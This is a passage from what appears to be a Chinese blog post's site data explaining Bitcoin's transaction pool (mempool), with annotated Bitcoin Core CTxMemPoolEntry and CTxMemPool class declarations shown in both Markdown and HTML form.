   uint64_t limitAncestorCount, \n                                   uint64_t limitAncestorSize,\n                                   uint64_t limitDescendantCount, \n                                   uint64_t limitDescendantSize, \n                                   std::string &errString, \n                                   bool fSearchForParents = true\n                                  ) const;\n\n    // 计算交易池中指定交易的子孙交易\n    void CalculateDescendants(txiter it, setEntries &setDescendants);\n\n    CFeeRate GetMinFee(size_t sizelimit) const;\n\n    void TrimToSize(size_t sizelimit, std::vector<COutPoint>* pvNoSpendsRemaining=nullptr);\n\n    // 剔除交易池中比指定时间早的交易，并将剔除的个数返回\n    int Expire(int64_t time);\n\n    // 当交易在交易池中，并且不满足指定链限制时，返回假\n    bool TransactionWithinChainLimit(const uint256& txid, size_t chainLimit) const;\n    \n    // 返回mapTx中交易个数，即交易池中交易个数\n    unsigned long size()\n    {\n        LOCK(cs);\n        return mapTx.size();\n    }\n    \n    // 返回交易池中所有交易的虚拟大小总和，不包括见证数据\n    uint64_t GetTotalTxSize() const\n    {\n        LOCK(cs);\n        return totalTxSize;\n    }\n    \n    // 查询一笔交易是否在当前交易池中\n    bool exists(uint256 hash) const\n    {\n        LOCK(cs);\n        return (mapTx.count(hash) != 0);\n    }\n\n    // 获取指定hash值对应的交易引用\n    CTransactionRef get(const uint256& hash) const;\n    // 获得交易池中交易信息\n    TxMempoolInfo info(const uint256& hash) const;\n    // 获得交易池中所有交易信息\n    std::vector<TxMempoolInfo> infoAll() const;\n    \n    // 获得动态内存大小\n    size_t DynamicMemoryUsage() const;\n\n    boost::signals2::signal<void (CTransactionRef)> NotifyEntryAdded;\n    boost::signals2::signal<void (CTransactionRef, MemPoolRemovalReason)> NotifyEntryRemoved;\n\nprivate:\n    // 更新子孙交易状态 \n    void UpdateForDescendants(txiter updateIt,cacheMap &cachedDescendants,const std::set<uint256> &setExclude);\n    // 更新祖先交易状态\n    void UpdateAncestorsOf(bool add, txiter hash, setEntries &setAncestors);\n    // 更新指定交易的祖先状态\n    void UpdateEntryForAncestors(txiter it, const setEntries &setAncestors);\n    // 当一笔交易从交易池中剔除时，需更新其祖先和所有直接的儿子交易\n    // 当updateDescendants为真时，也同时更新交易池中子孙交易的祖先交易状态\n    void UpdateForRemoveFromMempool(const setEntries &entriesToRemove, bool updateDescendants);\n    // 更新父子交易关联\n    void UpdateChildrenForRemoval(txiter entry);\n    // 对于一个特定的交易，调用 removeUnchecked之前，必须为同时为要移除的交易集合调用UpdateForRemoveFromMempool。\n    void removeUnchecked(txiter entry, MemPoolRemovalReason reason = MemPoolRemovalReason::UNKNOWN);\n\n};\n```\n","slug":"比特币挖矿之交易池","published":1,"updated":"2018-03-16T10:03:24.495Z","layout":"post","photos":[],"link":"","_id":"cjf7piaw3001rpkwok0927on5","content":"<p>在<a href=\"http://c60block.com/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1/\" target=\"_blank\" rel=\"noopener\">比特币挖矿之矿工任务</a>中我们提到，矿工会监听交易广播，并把通过验证的交易放入本地交易池。当然矿工可以通过设置最低交易费等规则来控制交易池的大小，在一个区块完成竞争后，矿工会按照一定的规则，从交易池中取出交易，在保证大部分交易都能得到打包的情况下，赚取更多的手续费。这儿交易池的作用就是在本地存放未确认的交易，作为区块打包的仓库，一笔交易被收录进交易池的流程如下：<br>1、验证交易是否有效（是否是规范交易，是否双花，签名是否有效，支付方是否有足够的余额），如果无效直接拒绝<br>2、验证是否是孤儿交易，如果是，本地保存，不转发，防DDOS攻击<br>3、按照一定排序规则加入交易池</p>\n<p>当然交易池中也存在交易清理机制，当出现如下情况时，交易会被清理出交易池：<br>1、交易池达到上限，会将交易池中排名末端的交易剔除出去<br>2、出现交易双花，满足交易替换规则（手续费更高的会被留下），低手续费交易及其子孙交易会被剔除出去<br>3、最新块中已经包含的交易会被剔除掉<br>4、与最新块中已经包含交易冲突的交易及其子孙交易会被剔除掉<br>5、交易在交易池中存在时间过长</p>\n<p>在比特币系统中，使用CTxMemPoolEntry来封装被接受的交易，使用CTxMemPool对象来表示整个交易池信息。<br><a href=\"https://github.com/bitcoin/bitcoin/blob/master/src/txmempool.h#L64\" target=\"_blank\" rel=\"noopener\">CTxMemPoolEntry</a>:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class CTxMemPoolEntry</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">    // 交易引用</span><br><span class=\"line\">    CTransactionRef tx;</span><br><span class=\"line\">    // 交易费</span><br><span class=\"line\">    CAmount nFee;</span><br><span class=\"line\">    // 交易weight</span><br><span class=\"line\">    size_t nTxWeight;</span><br><span class=\"line\">    // 大小</span><br><span class=\"line\">    size_t nUsageSize;</span><br><span class=\"line\">    // 加入交易池时间</span><br><span class=\"line\">    int64_t nTime;</span><br><span class=\"line\">    // 加入交易池时区块高度</span><br><span class=\"line\">    unsigned int entryHeight;</span><br><span class=\"line\">    // 上笔交易来源于Coinbase交易</span><br><span class=\"line\">    bool spendsCoinbase;</span><br><span class=\"line\"></span><br><span class=\"line\">    int64_t sigOpCost;</span><br><span class=\"line\">    // 此参数用来决定该笔交易的挖矿优先级</span><br><span class=\"line\">    int64_t feeDelta;</span><br><span class=\"line\">    // 该笔交易在加入区块链前区块的高度和时间</span><br><span class=\"line\">    LockPoints lockPoints;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 子孙交易信息，当剔除该交易时，所有子孙交易也必须同时剔除掉</span><br><span class=\"line\">    // 子孙交易数量</span><br><span class=\"line\">    uint64_t nCountWithDescendants;</span><br><span class=\"line\">    // 子孙交易总大小</span><br><span class=\"line\">    uint64_t nSizeWithDescendants;</span><br><span class=\"line\">    // 子孙交易交易费之和</span><br><span class=\"line\">    CAmount nModFeesWithDescendants;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 祖先交易信息，当剔除该交易时，对应的祖先交易也应更新子孙信息</span><br><span class=\"line\">    // 祖先交易数量</span><br><span class=\"line\">    uint64_t nCountWithAncestors;</span><br><span class=\"line\">    // 祖先交易大小</span><br><span class=\"line\">    uint64_t nSizeWithAncestors;</span><br><span class=\"line\">    // 祖先交易总手续费之和</span><br><span class=\"line\">    CAmount nModFeesWithAncestors;</span><br><span class=\"line\"></span><br><span class=\"line\">    int64_t nSigOpCostWithAncestors;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 成员方法</span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>我们注意到CTxMemPoolEntry对象不只包括交易本身的信息。还包括子孙交易和祖先交易信息，这些信息将在交易加入交易池排序时用到，下文将会具体介绍。</p>\n<p><a href=\"https://github.com/bitcoin/bitcoin/blob/master/src/txmempool.h#L440\" target=\"_blank\" rel=\"noopener\">CTxMemPool</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class CTxMemPool</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">    // 在2^32时间内检查的次数</span><br><span class=\"line\">    uint32_t nCheckFrequency;</span><br><span class=\"line\">    </span><br><span class=\"line\">    unsigned int nTransactionsUpdated;</span><br><span class=\"line\">    CBlockPolicyEstimator* minerPolicyEstimator;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 交易池中所有交易的虚拟大小，不包括隔离见证数据</span><br><span class=\"line\">    uint64_t totalTxSize;</span><br><span class=\"line\">    // mapTx中所有元素的动态内存大小之和</span><br><span class=\"line\">    uint64_t cachedInnerUsage;</span><br><span class=\"line\"></span><br><span class=\"line\">    mutable int64_t lastRollingFeeUpdate;</span><br><span class=\"line\">    mutable bool blockSinceLastRollingFeeBump;</span><br><span class=\"line\">    // 进入交易池的最小交易费</span><br><span class=\"line\">    mutable double rollingMinimumFeeRate;</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    void trackPackageRemoved(const CFeeRate&amp; rate);</span><br><span class=\"line\"></span><br><span class=\"line\">public:</span><br><span class=\"line\">    </span><br><span class=\"line\">    static const int ROLLING_FEE_HALFLIFE = 60 * 60 * 12; // public only for testing</span><br><span class=\"line\"></span><br><span class=\"line\">    // 将CTxMemPoolEntry按照交易Hash，交易费率，加入交易池时间，祖先交易费率加入到多索引容器中</span><br><span class=\"line\">    // 这儿的排序直接决定了交易被打包进区块和剔除出交易池的先后顺序</span><br><span class=\"line\">    typedef boost::multi_index_container&lt;</span><br><span class=\"line\">        CTxMemPoolEntry,</span><br><span class=\"line\">        boost::multi_index::indexed_by&lt;</span><br><span class=\"line\">            // 以txid排序</span><br><span class=\"line\">            boost::multi_index::hashed_unique&lt;mempoolentry_txid, SaltedTxidHasher&gt;,</span><br><span class=\"line\">            // 以交易费率排序</span><br><span class=\"line\">            boost::multi_index::ordered_non_unique&lt;</span><br><span class=\"line\">                boost::multi_index::tag&lt;descendant_score&gt;,</span><br><span class=\"line\">                boost::multi_index::identity&lt;CTxMemPoolEntry&gt;,</span><br><span class=\"line\">                CompareTxMemPoolEntryByDescendantScore</span><br><span class=\"line\">            &gt;,</span><br><span class=\"line\">            // 以交易加入交易池时间排序</span><br><span class=\"line\">            boost::multi_index::ordered_non_unique&lt;</span><br><span class=\"line\">                boost::multi_index::tag&lt;entry_time&gt;,</span><br><span class=\"line\">                boost::multi_index::identity&lt;CTxMemPoolEntry&gt;,</span><br><span class=\"line\">                CompareTxMemPoolEntryByEntryTime</span><br><span class=\"line\">            &gt;,</span><br><span class=\"line\">            // 以祖先交易费率排序</span><br><span class=\"line\">            boost::multi_index::ordered_non_unique&lt;</span><br><span class=\"line\">                boost::multi_index::tag&lt;ancestor_score&gt;,</span><br><span class=\"line\">                boost::multi_index::identity&lt;CTxMemPoolEntry&gt;,</span><br><span class=\"line\">                CompareTxMemPoolEntryByAncestorFee</span><br><span class=\"line\">            &gt;</span><br><span class=\"line\">        &gt;</span><br><span class=\"line\">    &gt; indexed_transaction_set;</span><br><span class=\"line\"></span><br><span class=\"line\">    mutable CCriticalSection cs;</span><br><span class=\"line\">    // 满足交易池加入条件的交易都将缓存到mapTx中</span><br><span class=\"line\">    indexed_transaction_set mapTx;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 以txid为索引的迭代器</span><br><span class=\"line\">    typedef indexed_transaction_set::nth_index&lt;0&gt;::type::iterator txiter;</span><br><span class=\"line\">    // </span><br><span class=\"line\">    std::vector&lt;std::pair&lt;uint256, txiter&gt; &gt; vTxHashes;</span><br><span class=\"line\"></span><br><span class=\"line\">    // Hash比较器</span><br><span class=\"line\">    struct CompareIteratorByHash &#123;</span><br><span class=\"line\">        bool operator()(const txiter &amp;a, const txiter &amp;b) const &#123;</span><br><span class=\"line\">            return a-&gt;GetTx().GetHash() &lt; b-&gt;GetTx().GetHash();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    typedef std::set&lt;txiter, CompareIteratorByHash&gt; setEntries;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 获取当前交易池中的父辈交易集合</span><br><span class=\"line\">    const setEntries &amp; GetMemPoolParents(txiter entry) const;</span><br><span class=\"line\">    // 获取当前交易池中的子辈交易集合</span><br><span class=\"line\">    const setEntries &amp; GetMemPoolChildren(txiter entry) const;</span><br><span class=\"line\">private:</span><br><span class=\"line\">    typedef std::map&lt;txiter, setEntries, CompareIteratorByHash&gt; cacheMap;</span><br><span class=\"line\"></span><br><span class=\"line\">    struct TxLinks &#123;</span><br><span class=\"line\">        setEntries parents;</span><br><span class=\"line\">        setEntries children;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 缓存交易与祖先交易和子孙交易的关联</span><br><span class=\"line\">    typedef std::map&lt;txiter, TxLinks, CompareIteratorByHash&gt; txlinksMap;</span><br><span class=\"line\">    txlinksMap mapLinks;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 更新父辈交易的状态</span><br><span class=\"line\">    void UpdateParent(txiter entry, txiter parent, bool add);</span><br><span class=\"line\">    // 更新子辈交易的状态</span><br><span class=\"line\">    void UpdateChild(txiter entry, txiter child, bool add);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 返回根据祖先交易数量排序的交易集合</span><br><span class=\"line\">    std::vector&lt;indexed_transaction_set::const_iterator&gt; GetSortedDepthAndScore() const;</span><br><span class=\"line\"></span><br><span class=\"line\">public:</span><br><span class=\"line\">    // 缓存交易来源与交易的关联</span><br><span class=\"line\">    indirectmap&lt;COutPoint, const CTransaction*&gt; mapNextTx;</span><br><span class=\"line\">    std::map&lt;uint256, CAmount&gt; mapDeltas;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 创建一个新交易池，只能显式创建</span><br><span class=\"line\">    explicit CTxMemPool(CBlockPolicyEstimator* estimator = nullptr);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 如果开启了sanity-checking，check函数将保证交易池的一致性（不存在双花的情况），如果关闭sanity-checking，则什么都不做</span><br><span class=\"line\">    void check(const CCoinsViewCache *pcoins) const;</span><br><span class=\"line\">    // 设置sanity-checking ncheckFrequency 默认为2^32-1</span><br><span class=\"line\">    void setSanityCheck(double dFrequency = 1.0) &#123; nCheckFrequency = static_cast&lt;uint32_t&gt;(dFrequency * 4294967295.0); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 将一笔交易加入交易池</span><br><span class=\"line\">    bool addUnchecked(const uint256&amp; hash, const CTxMemPoolEntry &amp;entry, bool validFeeEstimate = true);</span><br><span class=\"line\">    bool addUnchecked(const uint256&amp; hash, const CTxMemPoolEntry &amp;entry, setEntries &amp;setAncestors, bool validFeeEstimate = true);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 将交易剔除出交易池</span><br><span class=\"line\">    // 剔除交易及其子孙交易</span><br><span class=\"line\">    void removeRecursive(const CTransaction &amp;tx, MemPoolRemovalReason reason = MemPoolRemovalReason::UNKNOWN);</span><br><span class=\"line\">    // 剔除来源为coinbase交易，但是没有成熟，所在区块最终成为孤儿块的情况</span><br><span class=\"line\">    void removeForReorg(const CCoinsViewCache *pcoins, unsigned int nMemPoolHeight, int flags);</span><br><span class=\"line\">    // 剔除与已记录在区块链中交易冲突的交易及子孙交易（双花，该交易加入交易池时，另外一笔交易可能尚未被加入到区块链上）</span><br><span class=\"line\">    void removeConflicts(const CTransaction &amp;tx);</span><br><span class=\"line\">    // 当节点接收到一个新块时，剔除已经打包进区块中的交易以及冲突交易</span><br><span class=\"line\">    void removeForBlock(const std::vector&lt;CTransactionRef&gt;&amp; vtx, unsigned int nBlockHeight);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 清空交易池</span><br><span class=\"line\">    void clear();</span><br><span class=\"line\">    void _clear();</span><br><span class=\"line\"></span><br><span class=\"line\">    // 比较两笔交易的祖先交易数量，当数量相等时，比较交易费率</span><br><span class=\"line\">    bool CompareDepthAndScore(const uint256&amp; hasha, const uint256&amp; hashb);</span><br><span class=\"line\">    </span><br><span class=\"line\">    void queryHashes(std::vector&lt;uint256&gt;&amp; vtxid);</span><br><span class=\"line\">    // 盘算交易的来源是否是CoinBase交易</span><br><span class=\"line\">    bool isSpent(const COutPoint&amp; outpoint);</span><br><span class=\"line\">    // 获取交易更新的次数</span><br><span class=\"line\">    unsigned int GetTransactionsUpdated() const;</span><br><span class=\"line\">    // 调整交易更新的次数</span><br><span class=\"line\">    void AddTransactionsUpdated(unsigned int n);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 判断交易中是否存在input为空的情况</span><br><span class=\"line\">    bool HasNoInputsOf(const CTransaction&amp; tx) const;</span><br><span class=\"line\">    // 调整CreateNewBlock时交易的优先级</span><br><span class=\"line\">    void PrioritiseTransaction(const uint256&amp; hash, const CAmount&amp; nFeeDelta);</span><br><span class=\"line\">    // </span><br><span class=\"line\">    void ApplyDelta(const uint256 hash, CAmount &amp;nFeeDelta) const;</span><br><span class=\"line\">    // </span><br><span class=\"line\">    void ClearPrioritisation(const uint256 hash);</span><br><span class=\"line\"></span><br><span class=\"line\">public:</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 从交易池中剔除一组交易。如果一笔交易在这个集合中，那么该笔交易在交易池中的所有子孙交易都应该在该集合中</span><br><span class=\"line\">    // 除非这笔交易是因为被包含在一个区块中而被剔除。</span><br><span class=\"line\">    // 当因为一笔交易被包含在区块中而删除时，设置updateDescendants为真，这样所有在该交易池中的子孙交易可以将他们的祖先交易状态更新</span><br><span class=\"line\">    void RemoveStaged(setEntries &amp;stage, bool updateDescendants, MemPoolRemovalReason reason = MemPoolRemovalReason::UNKNOWN);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 将孤块中包含的交易信息更新到交易池</span><br><span class=\"line\">    void UpdateTransactionsFromBlock(const std::vector&lt;uint256&gt; &amp;vHashesToUpdate);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 计算交易池中指定交易的所有祖先交易（包含该交易本身）</span><br><span class=\"line\">    bool CalculateMemPoolAncestors(const CTxMemPoolEntry &amp;entry, </span><br><span class=\"line\">                                   setEntries &amp;setAncestors, </span><br><span class=\"line\">                                   uint64_t limitAncestorCount, </span><br><span class=\"line\">                                   uint64_t limitAncestorSize,</span><br><span class=\"line\">                                   uint64_t limitDescendantCount, </span><br><span class=\"line\">                                   uint64_t limitDescendantSize, </span><br><span class=\"line\">                                   std::string &amp;errString, </span><br><span class=\"line\">                                   bool fSearchForParents = true</span><br><span class=\"line\">                                  ) const;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 计算交易池中指定交易的子孙交易</span><br><span class=\"line\">    void CalculateDescendants(txiter it, setEntries &amp;setDescendants);</span><br><span class=\"line\"></span><br><span class=\"line\">    CFeeRate GetMinFee(size_t sizelimit) const;</span><br><span class=\"line\"></span><br><span class=\"line\">    void TrimToSize(size_t sizelimit, std::vector&lt;COutPoint&gt;* pvNoSpendsRemaining=nullptr);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 剔除交易池中比指定时间早的交易，并将剔除的个数返回</span><br><span class=\"line\">    int Expire(int64_t time);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 当交易在交易池中，并且不满足指定链限制时，返回假</span><br><span class=\"line\">    bool TransactionWithinChainLimit(const uint256&amp; txid, size_t chainLimit) const;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 返回mapTx中交易个数，即交易池中交易个数</span><br><span class=\"line\">    unsigned long size()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        LOCK(cs);</span><br><span class=\"line\">        return mapTx.size();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 返回交易池中所有交易的虚拟大小总和，不包括见证数据</span><br><span class=\"line\">    uint64_t GetTotalTxSize() const</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        LOCK(cs);</span><br><span class=\"line\">        return totalTxSize;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 查询一笔交易是否在当前交易池中</span><br><span class=\"line\">    bool exists(uint256 hash) const</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        LOCK(cs);</span><br><span class=\"line\">        return (mapTx.count(hash) != 0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 获取指定hash值对应的交易引用</span><br><span class=\"line\">    CTransactionRef get(const uint256&amp; hash) const;</span><br><span class=\"line\">    // 获得交易池中交易信息</span><br><span class=\"line\">    TxMempoolInfo info(const uint256&amp; hash) const;</span><br><span class=\"line\">    // 获得交易池中所有交易信息</span><br><span class=\"line\">    std::vector&lt;TxMempoolInfo&gt; infoAll() const;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 获得动态内存大小</span><br><span class=\"line\">    size_t DynamicMemoryUsage() const;</span><br><span class=\"line\"></span><br><span class=\"line\">    boost::signals2::signal&lt;void (CTransactionRef)&gt; NotifyEntryAdded;</span><br><span class=\"line\">    boost::signals2::signal&lt;void (CTransactionRef, MemPoolRemovalReason)&gt; NotifyEntryRemoved;</span><br><span class=\"line\"></span><br><span class=\"line\">private:</span><br><span class=\"line\">    // 更新子孙交易状态 </span><br><span class=\"line\">    void UpdateForDescendants(txiter updateIt,cacheMap &amp;cachedDescendants,const std::set&lt;uint256&gt; &amp;setExclude);</span><br><span class=\"line\">    // 更新祖先交易状态</span><br><span class=\"line\">    void UpdateAncestorsOf(bool add, txiter hash, setEntries &amp;setAncestors);</span><br><span class=\"line\">    // 更新指定交易的祖先状态</span><br><span class=\"line\">    void UpdateEntryForAncestors(txiter it, const setEntries &amp;setAncestors);</span><br><span class=\"line\">    // 当一笔交易从交易池中剔除时，需更新其祖先和所有直接的儿子交易</span><br><span class=\"line\">    // 当updateDescendants为真时，也同时更新交易池中子孙交易的祖先交易状态</span><br><span class=\"line\">    void UpdateForRemoveFromMempool(const setEntries &amp;entriesToRemove, bool updateDescendants);</span><br><span class=\"line\">    // 更新父子交易关联</span><br><span class=\"line\">    void UpdateChildrenForRemoval(txiter entry);</span><br><span class=\"line\">    // 对于一个特定的交易，调用 removeUnchecked之前，必须为同时为要移除的交易集合调用UpdateForRemoveFromMempool。</span><br><span class=\"line\">    void removeUnchecked(txiter entry, MemPoolRemovalReason reason = MemPoolRemovalReason::UNKNOWN);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>在<a href=\"http://c60block.com/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1/\" target=\"_blank\" 